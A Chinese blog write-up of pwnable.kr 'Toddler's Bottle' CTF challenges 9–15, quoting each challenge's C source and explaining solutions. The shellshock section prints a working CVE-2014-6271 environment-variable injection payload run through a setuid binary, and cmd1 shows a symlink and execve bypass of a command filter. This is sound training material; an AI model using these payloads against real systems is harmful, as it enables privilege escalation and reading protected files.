# pwnable刷题writeup之Toddler’s Bottle（二）

> 来源：http://burningcodes.net/pwnable%E5%88%B7%E9%A2%98writeup%E4%B9%8Btoddlers-bottle%EF%BC%88%E4%BA%8C%EF%BC%89/

这篇文章接着上篇 [pwnable刷题writeup之Toddler’s Bottle（一）](http://burningcodes.net/pwnable%e5%88%b7%e9%a2%98writeup%e4%b9%8btoddlers-bottle%ef%bc%88%e4%b8%80%ef%bc%89/) ：

## 9.mistake

```
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
    int i;
    for(i=0; i<len; i++){
        s[i] ^= XORKEY;
    }
}

int main(int argc, char* argv[]){

    int fd;
    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
        printf("can't open password %d\n", fd);
        return 0;
    }

    printf("do not bruteforce...\n");
    sleep(time(0)%20);

    char pw_buf[PW_LEN+1];
    int len;
    if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
        printf("read error\n");
        close(fd);
        return 0;        
    }

    char pw_buf2[PW_LEN+1];
    printf("input password : ");
    scanf("%10s", pw_buf2);

    // xor your input
    xor(pw_buf2, 10);

    if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
        printf("Password OK\n");
        system("/bin/cat flag\n");
    }
    else{
        printf("Wrong Password\n");
    }

    close(fd);
    return 0;
}
```

有问题的代码为：

```
fd=open("/tmp/xx.txt",O_RDONLY,0400) < 0
```

&lt;的优先级大于=，所以在打开文件后现执行open(“/tmp/xx.txt”,O_RDONLY,0400) &lt; 0 ,正常open时返回的值大于0， 正数&lt;0 比较之后为0，然后再赋值给fd，fd=0时对应着标准输入，所以后面会从标准输入中读取password，而不是从文件中读取。

## 10.shellshock

这题考察shellshock漏洞，ssh登入发现目录下有一个有漏洞的bash，shellshock被设置了setuid位：

```
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

先来看看bash shellshock漏洞（参考： [http://drops.wooyun.org/papers/3268](http://drops.wooyun.org/papers/3268) ， [http://www.tuicool.com/articles/fEJbQn](http://www.tuicool.com/articles/fEJbQn) ）：

如果环境变量的值以字符“() {”开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。BASH处理以“(){”开头的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令。目录下有一个bash，输入：

```
env x='() { :;}; echo vulnerable' ./bash -c 'echo hello'
```

输出vulnerable  hello,表示这个目录下的bash存在bash shellshock漏洞。构造特定的环境变量，让有漏洞的bash执行输出flag的命令：

```
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include <unistd.h>

int main() {
    char *envp[2]={0};
    envp[0]="KKK=() { :; }; /home/shellshock/bash -c \"cat /home/shellshock/flag\"";
    execve("/home/shellshock/shellshock",NULL,envp);
    return 0;
}
```

输出flag：only if I knew CVE-2014-6271 ten years ago..!!

## 11.coin1

题目如下：

![](http://img2.tuicool.com/E3AZbuR.png!web)

题目意思是找出N个硬币中的假硬币,C是每次可以询问的次数（不能多也不能少）,这题用二分法查找即可。

```
zio版：

from zio import *

io = zio(('pwnable.kr',9007))

for m in xrange(100):
    io.read_until("\nN=")
    rr = io.readline()
    rrr = rr.split(' ')
    totalnum = int(rrr[0])
    trials = int(rrr[1][2:-1])

    #print "--->",totalnum,trials
    l = 0
    r = totalnum - 1
    mid = totalnum/2
    left = l
    right = mid
    answer = ""
    for i in xrange(trials):
        ss = [str(n) for n in range(left,right+1)]
        sends = " ".join(ss)
        io.writeline(sends)
        value = int(io.readline())
        #print 'value-->',value
        if value!=((right-left+1)*10):
            #print right,left,'here'
            r = mid
            mid = (r + l)/2
            right = mid
        else:
            l = mid + 1
            left = l
            mid = (r + l)/2
            right = mid
        if l>=r:
            answer = str(l)
            break
    #print '----<',i
    while i<trials-1:
        io.writeline(answer)
        i+=1
    #print 'find',l,r,answer
    io.writeline(answer)

print 'okokokflag-->'
flag = io.read_until('\n')
print flag
io.interact()
```

开始时用zio写的，结果网络延迟太大，只能换成在他服务器上跑(写入/tmp目录,提示为(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server))，但是服务器上又没有zio库，没办法只能写了个普通socket版的：

Python

```
普通socket版：

from socket import *
import random
import time

HOST = '0'
PORT = 9007
BUFSIZ = 99999
ADDR = (HOST, PORT)

tcpClientSock = socket(AF_INET, SOCK_STREAM)
tcpClientSock.connect(ADDR)

rec = tcpClientSock.recv(BUFSIZ)
time.sleep(4)

for m in xrange(100):

    time.sleep(0.2)
    rec = tcpClientSock.recv(BUFSIZ)
    idx = rec.find("N=")

    if idx != -1:
        tmp = rec[idx:].split(" ")
        totalnum = int(tmp[0][2:])
        trials = int(tmp[1][2:])
        print 'find-->',totalnum,trials
    else:
        print "not find"
    l = 0
    r = totalnum - 1
    mid = totalnum/2
    left = l
    right = mid
    answer = ""
    for i in xrange(trials):
        ss = [str(n) for n in range(left,right+1)]
        sends = " ".join(ss)
        tcpClientSock.send(sends+"\n")
        rec = tcpClientSock.recv(BUFSIZ)
        value = int(rec)
        #print 'value-->',value
        if value!=((right-left+1)*10):
            #print right,left,'here'
            r = mid
            mid = (r + l)/2
            right = mid
        else:
            l = mid + 1
            left = l
            mid = (r + l)/2
            right = mid
        if l>=r:
            answer = str(l)
            break
    while i<trials-1:
        tcpClientSock.send(answer+"\n")
        i+=1
    #print 'find',l,r,answer
    tcpClientSock.send(answer+"\n")
    rec = tcpClientSock.recv(BUFSIZ)
    print '---->',rec

time.sleep(0.2)
rec = tcpClientSock.recv(BUFSIZ)
print "over!flag=",rec

tcpClientSock.close()
```

跑出flag为：b1NaRy_S34rch1nG_1s_3asy_p3asy

## 12.blackjack

没看明白blackjack的规则。。。过段时间再研究研究

## 13.lotto

C

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

    int i;
    printf("Submit your 6 lotto bytes : ");
    fflush(stdout);

    int r;
    r = read(0, submit, 6);

    printf("Lotto Start!\n");
    //sleep(1);

    // generate lotto numbers
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1){
        printf("error. tell admin\n");
        exit(-1);
    }
    unsigned char lotto[6];
    if(read(fd, lotto, 6) != 6){
        printf("error2\. tell admin\n");
        exit(-1);
    }
    for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45
    }
    close(fd);

    // calculate lotto score
    int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }

    // win!
    if(match == 6){
        system("/bin/cat flag");
    }
    else{
        printf("bad luck...\n");
    }

}

void help(){
    printf("- nLotto Rule -\n");
    printf("nlotto is consisted with 6 random natural numbers less than 46\n");
    printf("your goal is to match lotto numbers as many as you can\n");
    printf("if you win lottery for *1st place*, you will get reward\n");
    printf("for more details, follow the link below\n");
    printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
    printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

    // menu
    unsigned int menu;

    while(1){

        printf("- Select Menu -\n");
        printf("1\. Play Lotto\n");
        printf("2\. Help\n");
        printf("3\. Exit\n");

        scanf("%d", &menu);

        switch(menu){
            case 1:
                play();
                break;
            case 2:
                help();
                break;
            case 3:
                printf("bye\n");
                return 0;
            default:
                printf("invalid menu\n");
                break;
        }
    }
    return 0;
}
```

问题处在以下循环：

```
for(i=0; i<6; i++){
    for(j=0; j<6; j++){
        if(lotto[i] == submit[j]){
            match++;
        }
    }
}
```

这个循环对每个输入的字符都比较了6次，而最后只需要有6次匹配则能出flag。只需要输入相同字符，则能大大增加匹配成功的概率(每次成功概率为6/45，多试几次就能得到flag)：

![](http://img1.tuicool.com/qaeeI3Q.png!web)

## 14.cmd1

```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/fuckyouverymuch");
    if(filter(argv[1])) return 0;
    system( argv[1] );
    return 0;
}
```

从题目可以看出，输入的命令不能含有flag，sh，tmp。在/tmp目录下新建一个文件夹，在这个文件夹中添加一个符号链接：

```
ln -s /home/cmd1/flag ffllaagg
```

在该目录下编译运行如下程序：

```
#include<stdio.h>
int main() {
    char *argv[3] = {0};
    argv[0] = "aaa";
    argv[1] = "/bin/cat ffllaagg";
    //chroot(".");//将临时根目录改成当前目录(这里不能用)
    execve("/home/cmd1/cmd1",argv,NULL);
    return 0;
}
```

得到flag ：mommy now I get what PATH environment is for ![](http://img1.tuicool.com/UZzIV3n.png!web)

## 15.cmd2

C

```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++)    memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

这题过滤了/，没法像上一题那样直接用符号链接，暂时还没搞定。。求大牛指导！